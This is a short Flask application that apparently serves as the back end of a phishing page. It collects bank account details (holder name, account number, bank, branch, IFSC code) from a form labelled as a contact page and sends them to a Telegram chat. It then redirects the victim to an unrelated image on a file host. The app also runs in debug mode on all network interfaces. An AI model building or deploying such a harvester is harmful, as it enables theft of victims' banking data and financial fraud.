from flask import Flask, request, render_template, redirect, url_for
import telebot
import os

# Load environment variables and initialize Flask and Telebot
app = Flask(__name__)
TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

bot = telebot.TeleBot(TOKEN)

@app.route('/')
def index():
    return render_template('contact.html')

@app.route('/submit', methods=['POST'])
def submit():
    # Retrieve form data
    account_holder = request.form.get('account_holder')
    account_number = request.form.get('account_number')
    bank_name = request.form.get('bank_name')
    branch_name = request.form.get('branch_name')
    ifsc_code = request.form.get('ifsc_code')

    # Format message for Telegram
    telegram_message = (
        f"New Bank Details Submission:\n"
        f"Account Holder Name: {account_holder}\n"
        f"Account Number: {account_number}\n"
        f"Bank Name: {bank_name}\n"
        f"Branch Name: {branch_name}\n"
        f"IFSC Code: {ifsc_code}"
    )

    # Send message to Telegram
    bot.send_message(CHAT_ID, telegram_message)

    # Redirect to a specific URL
    return redirect("https://files.catbox.moe/3cd0gt.jpeg")

# Define the /urlhere route
@app.route('/urlhere')
def urlhere():
    return "You have been redirected here!"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
